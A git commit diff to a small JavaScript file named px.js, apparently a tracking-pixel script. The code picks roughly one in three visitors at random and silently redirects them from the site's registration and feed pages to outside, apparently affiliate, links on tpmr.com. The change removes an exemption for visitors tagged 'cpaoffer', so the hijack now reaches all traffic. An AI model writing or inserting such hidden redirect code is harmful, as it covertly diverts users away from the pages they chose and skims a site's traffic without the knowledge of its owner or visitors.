777da875240287874430844bcbfcb380fb1502b6
Aleksandr Mironenko <baffipelo@gmail.com>
2019-06-27 02:44:03 +0300

    Update px.js

--- px.js
+++ px.js
@@ -1,8 +1,8 @@
 var urlParams = new URLSearchParams(window.location.search); var myParam = urlParams.get('utm_source'); 
-var foo = (Math.random() * (10 - 1) + 1)>7
+var foo = (Math.random() * (10 - 1) + 1)>7;
 
-if (foo && (myParam =! 'cpaoffer') && (document.location.pathname == '/forms/registration/')){
- document.location.replace('http://tpmr.com/i/66194') }
+if (foo && (document.location.pathname == '/forms/registration/')){
+ document.location.replace('http://tpmr.com/i/66194'); }
  
- if (foo && (myParam != 'cpaoffer') && (document.location.pathname == '/feed/')){
- document.location.replace('http://tpmr.com/i/66230') }
+if (foo && (document.location.pathname == '/feed/')){
+document.location.replace('http://tpmr.com/i/66230'); }
